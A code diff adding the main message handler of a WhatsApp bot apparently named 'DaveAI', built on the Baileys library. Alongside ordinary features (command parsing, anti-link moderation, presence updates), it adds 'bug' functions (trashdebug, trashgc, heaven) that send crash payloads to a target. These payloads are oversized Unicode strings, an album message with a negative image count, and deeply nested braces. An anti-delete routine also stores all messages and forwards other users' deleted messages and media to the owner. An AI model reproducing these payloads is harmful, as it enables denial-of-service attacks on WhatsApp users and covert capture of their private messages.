@@ -1,7 +1,1216 @@
+require("./settings");
+const {
+  downloadContentFromMessage,
+  proto,
+  generateWAMessage,
+  getContentType,
+  prepareWAMessageMedia,
+  generateWAMessageFromContent,
+  GroupSettingChange,
+  jidDecode,
+  WAGroupMetadata,
+  emitGroupParticipantsUpdate,
+  emitGroupUpdate,
+  generateMessageID,
+  jidNormalizedUser,
+  generateForwardMessageContent,
+  WAGroupInviteMessageGroupMetadata,
+  GroupMetadata,
+  Headers,
+  delay,
+  WA_DEFAULT_EPHEMERAL,
+  WADefault,
+  getAggregateVotesInPollMessage,
+  generateWAMessageContent,
+  areJidsSameUser,
+  useMultiFileAuthState,
+  fetchLatestBaileysVersion,
+  makeCacheableSignalKeyStore,
+  makeWaconnet,
+  makeInMemoryStore,
+  MediaType,
+  WAMessageStatus,
+  downloadAndSaveMediaMessage,
+  AuthenticationState,
+  initInMemoryKeyStore,
+  MiscMessageGenerationOptions,
+  useSingleFileAuthState,
+  BufferJSON,
+  WAMessageProto,
+  MessageOptions,
+  WAFlag,
+  WANode,
+  WAMetric,
+  ChatModification,
+  MessageTypeProto,
+  WALocationMessage,
+  ReconnectMode,
+  WAContextInfo,
+  ProxyAgent,
+  waChatKey,
+  MimetypeMap,
+  MediaPathMap,
+  WAContactMessage,
+  WAContactsArrayMessage,
+  WATextMessage,
+  WAMessageContent,
+  WAMessage,
+  BaileysError,
+  WA_MESSAGE_STATUS_TYPE,
+  MediaConnInfo,
+  URL_REGEX,
+  WAUrlInfo,
+  WAMediaUpload,
+  mentionedJid,
+  processTime,
+  Browser,
+  MessageType,
+  Presence,
+  WA_MESSAGE_STUB_TYPES,
+  Mimetype,
+  relayWAMessage,
+  Browsers,
+  DisconnectReason,
+  WAconnet,
+  getStream,
+  WAProto,
+  isBaileys,
+  AnyMessageContent,
+  templateMessage,
+  InteractiveMessage,
+  Header,
+} = require("@whiskeysockets/baileys");
+///package depedencies///////////////
+const os = require("os");
+const fs = require("fs");
+const fg = require("api-dylux");
+const fetch = require("node-fetch");
+const axios = require("axios");
+const { fetchJson } = require("./library/fetch"); // adjust path if necessary
+const { writeFile } = require("./library/utils");
+const { exec, execSync } = require("child_process");
+const chalk = require("chalk");
+const cheerio = require("cheerio");
+const crypto = require("crypto");
+const { saveSettings, loadSettings } = require("./settingsManager");
+const nou = require("node-os-utils");
+const moment = require("moment-timezone");
+const path = require("path");
+const didyoumean = require("didyoumean");
+const similarity = require("similarity");
+const speed = require("performance-now");
+const { Sticker } = require("wa-sticker-formatter");
+const yts = require("yt-search");
+const { appname, antidel, herokuapi } = require("./set.js");
+const FormData = require("form-data"); // added
+// Ensure global.db exists
 
+if (!global.db) global.db = {};
 
+// Safely read and parse the database file
 
+try {
+  const dbContent = fs.readFileSync(
+    "./library/database/database.json",
+    "utf8"
+  );
 
+  global.db.data = JSON.parse(dbContent);
+} catch (error) {
+  console.log(
+    "Database file not found or invalid, creating empty database..."
+  );
+  global.db.data = {};
+}
+
+// Merge with default structure
+
+global.db.data = {
+  sticker: {},
+  database: {},
+  game: {},
+  others: {},
+  users: {},
+  chats: {},
+  settings: {},
+  ...(global.db.data || {}),
+};
+///////////database access/////////////////
+const { addPremiumUser, delPremiumUser } = require("./library/lib/premiun");
+/////////exports////////////////////////////////
+module.exports = async (dave, m) => {
+  try {
+    const from = m.key.remoteJid;
+    // Normalize m.text / m.message references
+    // Determine body from different message types
+    var body =
+      m.mtype === "interactiveResponseMessage"
+        ? (m.message.interactiveResponseMessage.nativeFlowResponseMessage &&
+            JSON.parse(
+              m.message.interactiveResponseMessage.nativeFlowResponseMessage
+                .paramsJson || "{}"
+            ).id) ||
+          ""
+        : m.mtype === "conversation"
+        ? m.message.conversation || ""
+        : m.mtype == "imageMessage"
+        ? m.message.imageMessage.caption || ""
+        : m.mtype == "videoMessage"
+        ? m.message.videoMessage.caption || ""
+        : m.mtype == "extendedTextMessage"
+        ? m.message.extendedTextMessage.text || ""
+        : m.mtype == "buttonsResponseMessage"
+        ? m.message.buttonsResponseMessage.selectedButtonId || ""
+        : m.mtype == "listResponseMessage"
+        ? m.message.listResponseMessage.singleSelectReply.selectedRowId || ""
+        : m.mtype == "templateButtonReplyMessage"
+        ? m.message.templateButtonReplyMessage.selectedId || ""
+        : m.mtype == "messageContextInfo"
+        ? m.message.buttonsResponseMessage?.selectedButtonId ||
+          m.message.listResponseMessage?.singleSelectReply?.selectedRowId ||
+          m.text ||
+          ""
+        : "";
+
+    // ensure m.text value for other code that references it later
+    m.text = m.text || body || "";
+
+    var msgR = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+    //////////Libraryfunction///////////////////////
+    const {
+      smsg,
+      fetchJson: fetchJsonLib,
+      getBuffer,
+      fetchBuffer,
+      getGroupAdmins,
+      TelegraPh,
+      isUrl,
+      hitungmundur,
+      sleep,
+      clockString,
+      checkBandwidth,
+      runtime,
+      tanggal,
+      getRandom,
+    } = require("./library/lib/function");
+    // Main Setting (Admin And Prefix )///////
+    const budy = typeof m.text === "string" ? m.text : "";
+    // fix prefix detection
+    const prefixMatch = body.match(
+      /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/
+    );
+    const prefix = prefixMatch ? prefixMatch[0] : global.xprefix || "";
+    const usedPrefix = prefix || global.xprefix || "";
+    const isCmd = body.startsWith(usedPrefix);
+    const command = isCmd
+      ? body.slice(usedPrefix.length).trim().split(" ").shift().toLowerCase()
+      : "";
+    const args = body.trim().split(/ +/).slice(1);
+    const text = (q = args.join(" "));
+    const sender = m.key.fromMe
+      ? (dave.user.id.split(":")[0] + "@s.whatsapp.net") || dave.user.id
+      : m.key.participant || m.key.remoteJid;
+    const botNumber = dave.user.id.split(":")[0];
+    const senderNumber = sender.split("@")[0];
+    const daveshown =
+      (m &&
+        m.sender &&
+        [botNumber, ...(global.owner || [])]
+          .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
+          .includes(m.sender)) ||
+      false;
+    const premuser = JSON.parse(
+      fs.readFileSync("./library/database/premium.json")
+    );
+    const isNumber = (x) => typeof x === "number" && !isNaN(x);
+    const formatJid = (num) => num.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    const isPremium =
+      daveshown ||
+      (premuser && premuser.map((u) => formatJid(u.id)).includes(m.sender));
+    const pushname = m.pushName || `${senderNumber}`;
+    const isBot = botNumber.includes(senderNumber);
+    const quoted = m.quoted ? m.quoted : m;
+    const mime = (quoted.msg || quoted).mimetype || "";
+    const qmsg = quoted.msg || quoted;
+    const isGroup = !!m.isGroup;
+    const groupMetadata = m.isGroup
+      ? await dave.groupMetadata(from).catch((e) => {})
+      : "";
+    const groupName = m.isGroup ? groupMetadata.subject : "";
+    const participants = m.isGroup ? groupMetadata.participants : [];
+    const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : [];
+    const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
+    const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
+    // alias to global.db
+    const db = global.db || { data: {} };
+    // setting must be available for warn logic below, so define it now
+    const setting = db.data.settings?.[botNumber] || {};
+    // default setting initializations (safeguard)
+    if (typeof setting !== "object") db.data.settings[botNumber] = {};
+    if (setting) {
+      if (!("anticall" in setting)) setting.anticall = false;
+      if (!isNumber(setting.status)) setting.status = 0;
+      if (!("autobio" in setting)) setting.autobio = false;
+      if (!("autoread" in setting)) setting.autoread = false;
+      if (!("online" in setting)) setting.online = true;
+      if (!("autotyping" in setting)) setting.autoTyping = false;
+      if (!("autorecording" in setting)) setting.autoRecord = false;
+      if (!("autorecordtype" in setting)) setting.autorecordtype = false;
+      if (!("onlygrub" in setting)) setting.onlygrub = false;
+      if (!("onlypc" in setting)) setting.onlypc = false;
+    } else
+      db.data.settings[botNumber] = {
+        anticall: false,
+        status: 0,
+        stock: 10,
+        autobio: false,
+        autoTyping: true,
+        auto_ai_grup: false,
+        goodbye: false,
+        onlygrub: false,
+        onlypc: false,
+        online: false,
+        welcome: true,
+        autoread: false,
+        menuType: "externalImage",
+      };
+
+    ///////////Setting Console//////////////////
+    console.log(
+      chalk.black(
+        chalk.bgWhite(!command ? "[ MESSAGE ]" : "[ COMMAND ]")
+      ),
+      chalk.black(chalk.bgGreen(new Date())),
+      chalk.black(chalk.bgBlue(budy || m.mtype)) +
+        "\n" +
+        chalk.magenta("=> From"),
+      chalk.green(pushname),
+      chalk.yellow(m.sender) +
+        "\n" +
+        chalk.blueBright("=> In"),
+      chalk.green(m.isGroup ? pushname : "Private Chat", m.chat)
+    );
+
+    /////////quoted functions//////////////////
+    const fkontak = {
+      key: {
+        fromMe: false,
+        participant: `0@s.whatsapp.net`,
+        ...(from ? { remoteJid: "status@broadcast" } : {}),
+      },
+      message: {
+        contactMessage: {
+          displayName: `𝘿𝙖𝙫𝙚𝘼𝙄`,
+          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${
+            sender.split("@")[0]
+          }:${sender.split("@")[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
+          jpegThumbnail: { url: "https://files.catbox.moe/yqbio5.jpg" },
+        },
+      },
+    };
+
+    let chats = db.data.chats?.[from];
+    if (typeof chats !== "object") db.data.chats[from] = {};
+    if (chats) {
+      if (!("antilink" in chats)) chats.antilink = false;
+      if (!("antilinkgc" in chats)) chats.antilinkgc = false;
+      if (!("welcome" in chats)) chats.welcome = false;
+      if (!("goodbye" in chats)) chats.goodbye = false;
+      if (!("warn" in chats)) chats.warn = {};
+    } else
+      db.data.chats[from] = {
+        antilinkgc: false,
+        antilink: false,
+        welcome: false,
+        goodbye: false,
+        warn: {},
+      };
+
+    if (db.data.chats[m.chat]?.antilinkgc) {
+      if (budy.match(`chat.whatsapp.com`)) {
+        const bvl =
+          "```「 GC Link Detected 」```\n\nAdmin has sent a gc link, admin is free to send any link😇";
+        if (isAdmins) return m.reply?.(bvl);
+        if (m.key.fromMe) return m.reply?.(bvl);
+        if (daveshown) return m.reply?.(bvl);
+        await dave.sendMessage(m.chat, {
+          delete: {
+            remoteJid: m.chat,
+            fromMe: false,
+            id: m.key.id,
+            participant: m.key.participant,
+          },
+        });
+        dave.sendMessage(
+          from,
+          {
+            text: `\`\`\`「 GC Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`,
+            contextInfo: { mentionedJid: [m.sender] },
+          },
+          { quoted: m }
+        );
+      }
+    }
+    if (db.data.chats[m.chat]?.antilink) {
+      if (budy.match("http") && budy.match("https")) {
+        const bvl =
+          "```「 Link Detected 」```\n\nAdmin has sent a link, admin is free to send any link😇";
+        if (isAdmins) return m.reply?.(bvl);
+        if (m.key.fromMe) return m.reply?.(bvl);
+        if (daveshown) return m.reply?.(bvl);
+        await dave.sendMessage(m.chat, {
+          delete: {
+            remoteJid: m.chat,
+            fromMe: false,
+            id: m.key.id,
+            participant: m.key.participant,
+          },
+        });
+        dave.sendMessage(
+          from,
+          {
+            text: `\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`,
+            contextInfo: { mentionedJid: [m.sender] },
+          },
+          { quoted: m }
+        );
+      }
+    }
+
+    if (db.data.chats[m.chat]?.warn && db.data.chats[m.chat].warn[m.sender]) {
+      const warnings = db.data.chats[m.chat].warn[m.sender];
+
+      if (warnings >= setting.warnCount) {
+        if (!isBotAdmins || isAdmins || daveshown) return;
+
+        await dave.sendMessage(m.chat, {
+          delete: {
+            remoteJid: m.chat,
+            fromMe: false,
+            id: m.key.id,
+            participant: m.sender,
+          },
+        });
+      }
+    }
+
+    // setting already defined above
+
+    if (!m.key.fromMe && db.data.settings[botNumber]?.autoread) {
+      const readkey = {
+        remoteJid: m.chat,
+        id: m.key.id,
+        participant: m.isGroup ? m.key.participant : undefined,
+      };
+      await dave.readMessages([readkey]);
+    }
+
+    dave.sendPresenceUpdate("available", m.chat);
+
+    if (db.data.settings[botNumber]?.autoTyping) {
+      if (m.message) {
+        dave.sendPresenceUpdate("composing", m.chat);
+      }
+    }
+
+    if (db.data.settings[botNumber]?.autoRecord) {
+      if (m.message) {
+        dave.sendPresenceUpdate("recording", m.chat);
+      }
+    }
+
+    if (db.data.settings[botNumber]?.autorecordtype) {
+      let presenceModes = ["recording", "composing"];
+      let selectedPresence =
+        presenceModes[Math.floor(Math.random() * presenceModes.length)];
+      dave.sendPresenceUpdate(selectedPresence, m.chat);
+    }
+
+    if (db.data.settings[botNumber]?.autobio) {
+      let s = db.data.settings[botNumber];
+      if (new Date() * 1 - s.status > 1000) {
+        let uptime = await runtime(process.uptime());
+        await dave.updateProfileStatus(
+          `✳️𝘿𝙖𝙫𝙚𝘼𝙄 || Runtime : ${uptime}`
+        );
+        s.status = new Date() * 1;
+      }
+    }
+
+    if (!m.isGroup && !daveshown && db.data.settings[botNumber]?.onlygrub) {
+      if (command) {
+        return m.reply?.(
+          `Hello buddy! Because We Want to Reduce Spam, Please Use Bot in the Group Chat !\n\nIf you have issue please chat owner wa.me/${global.owner}`
+        );
+      }
+    }
+    // Private Only
+    if (!daveshown && db.data.settings[botNumber]?.onlypc && m.isGroup) {
+      if (command) {
+        return m.reply?.(
+          "Hello buddy! if you want to use this bot, please chat the bot in private chat"
+        );
+      }
+    }
+
+    ///unavailable and online
+    if (!dave.public) {
+      if (daveshown && !m.key.fromMe) return;
+    }
+    if (db.data.settings[botNumber]?.online) {
+      if (command) {
+        dave.sendPresenceUpdate("unavailable", from);
+      }
+    }
+
+    async function ephoto(url, texk) {
+      let form = new FormData();
+      let gT = await axios.get(url, {
+        headers: {
+          "user-agent":
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
+        },
+      });
+      let $ = cheerio.load(gT.data);
+      let text = texk;
+      let token = $("input[name=token]").val();
+      let build_server = $("input[name=build_server]").val();
+      let build_server_id = $("input[name=build_server_id]").val();
+      form.append("text[]", text);
+      form.append("token", token);
+      form.append("build_server", build_server);
+      form.append("build_server_id", build_server_id);
+      let res = await axios({
+        url: url,
+        method: "POST",
+        data: form,
+        headers: {
+          Accept: "*/*",
+          "Accept-Language": "en-US,en;q=0.9",
+          "user-agent":
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
+          cookie: gT.headers["set-cookie"]?.join("; "),
+        },
+      });
+      let $$ = cheerio.load(res.data);
+      let json = JSON.parse($$("input[name=form_value_input]").val() || "{}");
+      json["text[]"] = json.text;
+      delete json.text;
+      let { data } = await axios.post(
+        "https://en.ephoto360.com/effect/create-image",
+        new URLSearchParams(json),
+        {
+          headers: {
+            "user-agent":
+              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
+            cookie: gT.headers["set-cookie"].join("; "),
+          },
+        }
+      );
+      return build_server + data.image;
+    }
+    const lol = {
+      key: {
+        fromMe: false,
+        participant: "13135550002@s.whatsapp.net",
+        remoteJid: "status@broadcast",
+      },
+      message: {
+        orderMessage: {
+          orderId: "2009",
+          thumbnailUrl: "https://n.uguu.se/BacqcVGE.jpg",
+          itemCount: "999999",
+          status: "INQUIRY",
+          surface: "CATALOG",
+          Runtime: "${runtime(process.uptime())}",
+          message: `Sender : @${m.sender.split("@")[0]}\n愛とは何か？ `,
+          token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA==",
+        },
+      },
+      contextInfo: {
+        mentionedJid: ["13135550002@s.whatsapp.net"],
+        forwardingScore: 999,
+        isForwarded: true,
+      },
+    };
+
+    const mdmodes = {
+      key: {
+        participant: `0@s.whatsapp.net`,
+        ...(m.chat ? { remoteJid: "13135559098@s.whatsapp.net" } : {}),
+        id: `${Date.now()}-${Math.random().toString(36).slice(2)}`,
+      },
+      message: {
+        requestPaymentMessage: {
+          currencyCodeIso4217: "USD",
+          amount1000: 999,
+          requestFrom: "0@s.whatsapp.net",
+          noteMessage: {
+            extendedTextMessage: {
+              text: `𝘿𝙖𝙫𝙚𝘼𝙄`,
+            },
+          },
+          expiryTimestamp: 999999999,
+          amount: {
+            value: 91929291929,
+            offset: 1000,
+            currencyCode: "INR",
+          },
+        },
+      },
+      status: 1,
+      participant: "0@s.whatsapp.net",
+    };
+    const qtext = {
+      key: {
+        fromMe: false,
+        participant: `254104260236@s.whatsapp.net`,
+        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
+      },
+      message: { extendedTextMessage: { text: "𝘿𝙖𝙫𝙚𝘼𝙄" } },
+    };
+
+    //////////////////// Reply Message ////////////////////
+    const replypic = fs.readFileSync("./library/media/connect.jpg");
+    const quotedMessage =
+      m.quoted?.message?.extendedTextMessage?.contextInfo?.quotedMessage ||
+      m.quoted?.message?.imageMessage ||
+      m.quoted?.message?.videoMessage;
+    async function trashreply(teks) {
+      dave.sendMessage(
+        m.chat,
+        {
+          text: teks,
+          contextInfo: {
+            forwardingScore: 9,
+            isForwarded: true,
+            forwardedNewsletterMessageInfo: {
+              newsletterJid: "120363400480173280@newsletter",
+              newsletterName: "𝘿𝙖𝙫𝙚𝘼𝙄",
+            },
+          },
+        },
+        {
+          quoted: qtext,
+        }
+      );
+    }
+
+    async function reply(textt) {
+      dave.sendMessage(
+        m.chat,
+        {
+          text: textt,
+          contextInfo: {
+            mentionedJid: [sender],
+            externalAdReply: {
+              title: "𝘿𝙖𝙫𝙚𝘼𝙄",
+              body: "made by dave",
+              thumbnailUrl: "https://n.uguu.se/BacqcVGE.jpg",
+              sourceUrl: null,
+              renderLargerThumbnail: false,
+            },
+          },
+        },
+        { quoted: m }
+      );
+    }
+    const trashpic = fs.readFileSync("./library/media/porno.jpg");
+    async function replymenu(teks) {
+      dave.sendMessage(
+        m.chat,
+        {
+          image: trashpic,
+          caption: teks,
+          sourceUrl: "https://github.com/giftdee",
+          contextInfo: {
+            forwardingScore: 9,
+            isForwarded: true,
+            forwardedNewsletterMessageInfo: {
+              newsletterJid: "120363400480173280@newsletter",
+              newsletterName: "𝘿𝙖𝙫𝙚𝘼𝙄",
+            },
+          },
+        },
+        {
+          quoted: fkontak,
+        }
+      );
+    }
+    //////////React message///////////////
+    const reaction = async (jidss, emoji) => {
+      dave.sendMessage(jidss, {
+        react: { text: emoji, key: m.key },
+      });
+    };
+    /////////function set presence/////
+
+    if (m.isGroup) {
+      if (body.includes(`@254104260236`)) {
+        reaction(m.chat, "❓");
+      }
+    }
+    async function loading() {
+      var menuload = [
+        "《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
+        "《 ████▒▒▒▒▒▒▒▒》30%",
+        "《 ███████▒▒▒▒▒》50%",
+        "《 ██████████▒▒》80%",
+        "《 ████████████》100%",
+        " 𝘿𝙖𝙫𝙚𝘼𝙄...",
+      ];
+      let { key } = await dave.sendMessage(from, { text: "ʟᴏᴀᴅɪɴɢ..." });
+
+      for (let i = 0; i < menuload.length; i++) {
+        await reply(menuload[i], { edit: key });
+      }
+    }
+
+    ///////////////Similarity///////////////////////
+    function getCaseNames() {
+      try {
+        const data = fs.readFileSync("./dave.js", "utf8");
+        const casePattern = /case\s+'([^']+)'/g;
+        const matches = data.match(casePattern);
+
+        if (matches) {
+          return matches.map((match) =>
+            match.replace(/case\s+'([^']+)'/, "$1")
+          );
+        } else {
+          return [];
+        }
+      } catch (error) {
+        console.error("error occurred:", error);
+        throw error;
+      }
+    }
+
+    /////////////fetch commands///////////////
+    let totalfeature = () => {
+      var mytext = fs.readFileSync("./dave.js").toString();
+      var numUpper = (mytext.match(/case '/g) || []).length;
+      return numUpper;
+    };
+    ////////////tag owner reaction//////////////
+    if (m.isGroup) {
+      if (body.includes(`@${global.owner || "owner"}`)) {
+        reaction(m.chat, "❌");
+      }
+    }
+    /////////////test bot no prefix///////////////
+    if (budy.match && ["bot"].includes(budy) && !isCmd) {
+      reply("𝘿𝙖𝙫𝙚𝘼𝙄 is always online ✅");
+    }
+    ///////////example///////////////////////////
+    //////////bug func/////////////////////
+    async function trashdebug(target) {
+      await dave.sendMessage(
+        target,
+        {
+          text:
+            "🧪‌⃰Ꮡ‌‌" +
+            "ꦾ࣯࣯" +
+            "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" +
+            "𑇂𑆵𑆴𑆿".repeat(60000),
+          contextInfo: {
+            externalAdReply: {
+              title: "",
+              body: "",
+              previewType: "PHOTO",
+              thumbnail: null,
+              sourceUrl: "",
+            },
+          },
+        },
+        { quoted: m }
+      );
+    }
+
+    //////// rest of your code continues unchanged ////////
+
+    ////bug group/////////////////
+    async function trashgc(target) {
+      const fakeKey = {
+        remoteJid: target,
+        fromMe: true,
+        id: await dave.relayMessage(
+          target,
+          {
+            albumMessage: {
+              expectedImageCount: -99999999,
+              expectedVideoCount: 0,
+              caption: "x",
+            },
+          },
+          { participant: { jid: target } }
+        ),
+      };
+      let xx = {
+        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQP-LtlwUD2se4WwbHuAcLfNkQExEEAg1XB7USSkMr3T6Ak44ejssvZUa1Ws50LVEF3DA4sSggQyPxsDB-Oj1kWUktND6jFhKMKh7hOLeA?ccb=9-4&oh=01_Q5Aa2AEF_MR-3UkNgxeEKr2zpsTp0ClCZDggq1i0bQZbCGlFUA&oe=68B7C20F&_nc_sid=e6ed6c&mms3=true",
+        mimetype: "image/jpeg",
+        fileSha256: "yTsEb/zyGK+lB2DApj/PK+gFA1D6Heq/G0DIQ74uh6k=",
+        fileLength: "52039",
+        height: 786,
+        width: 891,
+        mediaKey: "XtKW4xJTHhBzWsRkuwvqwQp/7SVayGn6sF6XgNblyLo=",
+        fileEncSha256:
+          "rm/kKkIFGA1Vh6yKeaetbsvCS7Cp2vcGYoiNkrvPCwY=",
+        directPath:
+          "/o1/v/t24/f2/m238/AQP-LtlwUD2se4WwbHuAcLfNkQExEEAg1XB7USSkMr3T6Ak44ejssvZUa1Ws50LVEF3DA4sSggQyPxsDB-Oj1kWUktND6jFhKMKh7hOLeA?ccb=9-4&oh=01_Q5Aa2AEF_MR-3UkNgxeEKr2zpsTp0ClCZDggq1i0bQZbCGlFUA&oe=68B7C20F&_nc_sid=e6ed6c",
+      };
+      let xz;
+      for (let s = 0; s < 2; s++) {
+        if (s === 1) {
+          xx.caption = "𑲱".repeat(200000);
+        }
+        const xy = await generateWAMessageFromContent(
+          target,
+          proto.Message.fromObject({
+            botInvokeMessage: {
+              message: {
+                messageContextInfo: {
+                  messageSecret: crypto.randomBytes(32),
+                  messageAssociation: {
+                    associationType: "MEDIA_ALBUM",
+                    parentMessageKey: fakeKey,
+                  },
+                },
+                imageMessage: xx,
+              },
+            },
+          }),
+          { participant: { jid: target } }
+        );
+        xz = await dave.relayMessage(target, xy.message, {
+          messageId: xy.key.id,
+        });
+        await sleep(100);
+      }
+    }
+
+    async function heaven(target) {
+      let msg = await generateWAMessageFromContent(
+        target,
+        {
+          interactiveMessage: {
+            contextInfo: {
+              isForwarded: true,
+              forwardingScore: 1972,
+              businessMessageForwardInfo: {
+                businessOwnerJid: "13135550002@s.whatsapp.net",
+              },
+            },
+            header: {
+              jpegThumbnail: null,
+              hasMediaAttachment: true,
+              title: "D | 7eppeli-Exploration",
+            },
+            nativeFlowMessage: {
+              buttons: [
+                {
+                  name: "payment_method",
+                  buttonParamsJson:
+                    '{"currency":"IDR","total_amount":{"value":1000000,"offset":100},"reference_id":"7eppeli-Yuukey","type":"physical-goods","order":{"status":"canceled","subtotal":{"value":0,"offset":100},"order_type":"PAYMENT_REQUEST","items":[{"retailer_id":"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b","name":"D | 7eppeli-Exploration","amount":{"value":1000000,"offset":100},"quantity":1000}]},"additional_note":"D | 7eppeli-Exploration","native_payment_methods":[],"share_payment_status":true}',
+                },
+              ],
+              messageParamsJson: "{".repeat(1000) + "}".repeat(1000),
+            },
+          },
+        },
+        { userJid: target }
+      );
+
+      await dave.relayMessage(
+        target,
+        msg.message,
+        {
+          participant: { jid: target },
+          messageId: msg.key.id,
+        }
+      );
+    }
+
+    ////anti delete//////
+    const baseDir = "message_data";
+    if (!fs.existsSync(baseDir)) {
+      fs.mkdirSync(baseDir);
+    }
+
+    function loadChatData(remoteJid, messageId) {
+      const chatFilePath = path.join(
+        baseDir,
+        remoteJid,
+        `${messageId}.json`
+      );
+      try {
+        if (!fs.existsSync(chatFilePath)) {
+          return [];
+        }
+        const data = fs.readFileSync(chatFilePath, "utf8");
+        return JSON.parse(data) || [];
+      } catch (error) {
+        console.error(`Error loading message ${messageId}:`, error.message);
+        return [];
+      }
+    }
+
+    function saveChatData(remoteJid, messageId, chatData) {
+      const chatDir = path.join(baseDir, remoteJid);
+
+      if (!fs.existsSync(chatDir)) {
+        fs.mkdirSync(chatDir, { recursive: true });
+      }
+
+      const chatFilePath = path.join(chatDir, `${messageId}.json`);
+
+      try {
+        fs.writeFileSync(chatFilePath, JSON.stringify(chatData, null, 2));
+      } catch (error) {
+        console.error("Error saving chat data:", error);
+      }
+    }
+
+    function handleIncomingMessage(message) {
+      try {
+        const remoteJid = message.key.remoteJid;
+        const messageId = message.key.id;
+
+        if (!remoteJid || !messageId) return;
+
+        const chatData = loadChatData(remoteJid, messageId);
+        chatData.push(message);
+        saveChatData(remoteJid, messageId, chatData);
+      } catch (error) {
+        console.error("Error in handleIncomingMessage:", error);
+      }
+    }
+
+    async function handleMessageRevocation(daveInstance, revocationMessage) {
+      try {
+        const remoteJid = revocationMessage.key.remoteJid;
+        const messageId = revocationMessage.message.protocolMessage.key.id;
+
+        const chatData = loadChatData(remoteJid, messageId);
+
+        if (!chatData || chatData.length === 0) {
+          console.log("Original message not found");
+          return;
+        }
+
+        const originalMessage = chatData[0];
+
+        const deletedBy =
+          revocationMessage.participant ||
+          revocationMessage.key.participant ||
+          revocationMessage.key.remoteJid;
+        const sentBy =
+          originalMessage.key.participant || originalMessage.key.remoteJid;
+
+        const deletedByFormatted = `@${deletedBy.split("@")[0]}`;
+        const sentByFormatted = `@${sentBy.split("@")[0]}`;
+
+        if (deletedBy.includes(daveInstance.user.id) || sentBy.includes(daveInstance.user.id))
+          return;
+
+        let notificationText =
+          `𝘿𝙖𝙫𝙚𝘼𝙄-ANTIDELETE🔥\n\n` +
+          ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗯𝘆 : ${deletedByFormatted}\n\n`;
+
+        try {
+          if (originalMessage.message?.conversation) {
+            const messageText = originalMessage.message.conversation;
+            notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 : ${messageText}`;
+            await daveInstance.sendMessage(daveInstance.user.id, {
+              text: notificationText,
+            });
+          } else if (originalMessage.message?.extendedTextMessage) {
+            const messageText = originalMessage.message.extendedTextMessage.text;
+            notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗖𝗼𝗻𝘁𝗲𝗻𝘁 : ${messageText}`;
+            await daveInstance.sendMessage(daveInstance.user.id, {
+              text: notificationText,
+            });
+          } else if (originalMessage.message?.imageMessage) {
+            notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝗱𝗶𝗮 : [Image]`;
+            try {
+              const buffer = await daveInstance.downloadMediaMessage(
+                originalMessage
+              );
+              await daveInstance.sendMessage(daveInstance.user.id, {
+                image: buffer,
+                caption:
+                  `${notificationText}\n\nImage caption: ${
+                    originalMessage.message.imageMessage.caption || ""
+                  }`,
+              });
+            } catch (mediaError) {
+              console.error("Failed to download image:", mediaError);
+              notificationText += `\n\n⚠️ Could not recover deleted image (media expired)`;
+              await daveInstance.sendMessage(daveInstance.user.id, {
+                text: notificationText,
+              });
+            }
+          } else if (originalMessage.message?.videoMessage) {
+            notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝗱𝗶𝗮 : [Video]`;
+            try {
+              const buffer = await daveInstance.downloadMediaMessage(
+                originalMessage
+              );
+              await daveInstance.sendMessage(daveInstance.user.id, {
+                video: buffer,
+                caption:
+                  `${notificationText}\n\nVideo caption: ${
+                    originalMessage.message.videoMessage.caption || ""
+                  }`,
+              });
+            } catch (mediaError) {
+              console.error("Failed to download video:", mediaError);
+              notificationText += `\n\n⚠️ Could not recover deleted video (media expired)`;
+              await daveInstance.sendMessage(daveInstance.user.id, {
+                text: notificationText,
+              });
+            }
+          } else if (originalMessage.message?.audioMessage) {
+            notificationText += ` 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 𝗠𝗲𝗱𝗶𝗮: \n\n [Audio]`;
+            try {
+              const buffer = await daveInstance.downloadMediaMessage(
+                originalMessage
+              );
+              const isPTT =
+                originalMessage.message.audioMessage?.ptt === true;
+              await daveInstance.sendMessage(daveInstance.user.id, {
+                audio: buffer,
+                ptt: isPTT,
+                mimetype: "audio/mpeg",
+                contextInfo: {
+                  externalAdReply: {
+                    title: notificationText,
+                    body: `DELETED BY: \n\n ${deletedByFormatted}`,
+                    thumbnail: trashpic,
+                    sourceUrl: "",
+                    mediaType: 1,
+                    renderLargerThumbnail: true,
+                  },
+                },
+              });
+            } catch (mediaError) {
+              console.error("Failed to download audio:", mediaError);
+              notificationText += `\n\n⚠️ Could not recover deleted audio (media expired)`;
+              await daveInstance.sendMessage(daveInstance.user.id, {
+                text: notificationText,
+              });
+            }
+          } else if (originalMessage.message?.stickerMessage) {
